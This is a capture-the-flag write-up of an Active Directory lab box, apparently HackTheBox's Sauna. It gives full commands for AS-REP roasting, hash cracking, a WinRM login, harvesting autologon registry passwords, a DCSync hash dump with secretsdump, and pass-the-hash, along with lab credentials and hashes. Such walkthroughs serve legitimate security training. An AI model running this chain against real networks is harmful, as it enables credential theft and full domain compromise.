Medium windows active-directory as-rep-roasting dcsync

A textbook Active Directory chain and one of the most OSCP-relevant medium boxes. Scrape usernames from the company website, find an account that lacks Kerberos pre-authentication, crack the AS-REP hash, log in over WinRM, discover auto-login credentials in the registry, pivot to a service account that holds replication privileges, and end it with a DCSync for the Administrator hash.

01 Reconnaissance

nmap -sC -sV -p- -T4 10.10.10.175 -oN nmap.txt
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Microsoft DNS
80/tcp   open  http         Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds Windows Server 2016 Standard
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0   (WinRM)
9389/tcp open  mc-nmf       .NET Message Framing

Classic domain controller fingerprint: 53, 88, 389, 445, 464, 636, 3268, 3269, 9389. Critically, 5985/tcp is open — that's WinRM, our foothold port if we land any valid domain credentials. From the LDAP / SMB data we can confirm the domain:

nmap --script smb-os-discovery -p 445 10.10.10.175
|_  FQDN: SAUNA.EGOTISTICAL-BANK.LOCAL

Domain: EGOTISTICAL-BANK.LOCAL. Hostname: SAUNA.

02 Username harvesting

Kerberos and LDAP will happily enumerate, but not without authentication here. Pivot to the website on port 80 — the company front page has an "About" section listing team members:

Fergus Smith
Hugo Bear
Bowie Taylor
Sophie Driver
Shaun Coins
Steven Kerb
Bradley Greer

Convert those into plausible AD sAMAccountName patterns. The two most common schemes are first.last and flast:

cat > users.txt <<'EOF'
fsmith
hbear
btaylor
sdriver
scoins
skerb
bgreer
fergus.smith
hugo.bear
bowie.taylor
sophie.driver
shaun.coins
steven.kerb
bradley.greer
EOF

03 AS-REP roasting

AS-REP roasting targets accounts where the DONT_REQ_PREAUTH UserAccountControl flag is set. For those users, the KDC will hand out an AS-REP encrypted with the user's password-derived key without requiring pre-authentication — meaning we can request one anonymously and crack it offline.

Spray the username list with Impacket:

impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ \
  -usersfile users.txt -dc-ip 10.10.10.175 -no-pass -format hashcat
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1c...[snip]...af

Exactly one hit — fsmith. Crack with hashcat mode 18200:

hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt --force
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...: Thestrokes23

Credentials: fsmith : Thestrokes23.

04 WinRM foothold as fsmith

Validate the credentials against WinRM (port 5985):

evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
*Evil-WinRM* PS C:\Users\FSmith\Documents>

Grab the user flag:

type ..\Desktop\user.txt

Before moving on, run whoami /all and net user fsmith /domain to map group membership. fsmith is a vanilla domain user — no special rights. Time to hunt for a lateral move.

05 Pivot — autologon registry creds

The quickest Windows credential-hunting tool is WinPEAS, but on a WinRM shell a few manual registry queries cover the highest-yield spots. Autologon creds are stored in plaintext under the Winlogon key:

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
DefaultUserName     REG_SZ    EGOTISTICALBANK\svc_loanmgr
DefaultPassword     REG_SZ    Moneymakestheworldgoround!
AutoAdminLogon      REG_SZ    1
Why this works: AutoAdminLogon requires the password to be stored in the clear under DefaultPassword. Any domain user who can read HKLM\SOFTWARE\...\Winlogon inherits that credential. This is the single most productive registry key on Windows post-exploitation.

New credentials: svc_loanmgr : Moneymakestheworldgoround!.

06 DCSync as svc_loanmgr

Before blindly trying DCSync, confirm what svc_loanmgr can do. Run BloodHound ingestion from the Linux side with the fresh creds:

bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
  -d egotistical-bank.local -ns 10.10.10.175 -c All --zip

Import the zip into BloodHound and mark svc_loanmgr as Owned. The "Find principals with DCSync rights" query returns — unsurprisingly — our service account. It holds GetChanges and GetChangesAll on the domain object, which together permit directory replication.

Execute the DCSync with Impacket's secretsdump:

impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435...:823452073d75b9d1cf70ebdf86c7f98e:::
krbtgt:502:aad3b435...:...
EGOTISTICALBANK.LOCAL\HSmith:1103:...
...

The Administrator NT hash is all we need. Pass-the-hash over WinRM:

evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt

07 Takeaways

  • OSINT is Active Directory recon. Employee lists on corporate websites are the canonical starting point for AD username generation. Three minutes on an About page saved us rockyou.txt.
  • Always AS-REP before you spray. On any AD environment, firing GetNPUsers against a username list is cheap, silent, and occasionally devastating. It's the first thing to try after you have any list of candidate users.
  • Autologon registry keys are ubiquitous. Help desks, test VMs, kiosks, and — apparently — fictional banks all leave plaintext credentials under Winlogon. Check it on every Windows foothold.
  • BloodHound over guessing. Confirming that svc_loanmgr had replication rights via the graph is more valuable than running secretsdump blindly — understanding why a path works matters for the report.
